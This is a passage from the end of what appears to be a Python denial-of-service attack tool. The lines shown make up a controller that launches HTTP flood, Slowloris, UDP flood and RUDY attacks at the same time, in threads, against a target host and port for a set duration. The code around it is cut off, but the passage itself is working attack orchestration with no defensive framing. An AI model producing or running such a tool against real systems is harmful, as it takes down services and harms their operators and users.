        if vector == AttackVector.MIXED:
            # Launch multiple vectors
            vectors = [AttackVector.HTTP_FLOOD, AttackVector.SLOWLORIS, 
                      AttackVector.UDP_FLOOD, AttackVector.RUDY]
            
            for vec in vectors:
                threads_per_vector = args.threads // len(vectors)
                vec_executor = AttackExecutor(
                    target=target,
                    port=args.port,
                    use_ssl=use_ssl,
                    threads=threads_per_vector,
                    duration=args.duration
                )
                
                thread = threading.Thread(
                    target=vec_executor.launch_attack, 
                    args=(vec,),
                    daemon=True
                )
                thread.start()
            
            # Wait for duration
            time.sleep(args.duration)
            logger.info("[!] Mixed attack completed")
        else:
            executor.launch_attack(vector)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    controller = DDoSController()
    controller.run()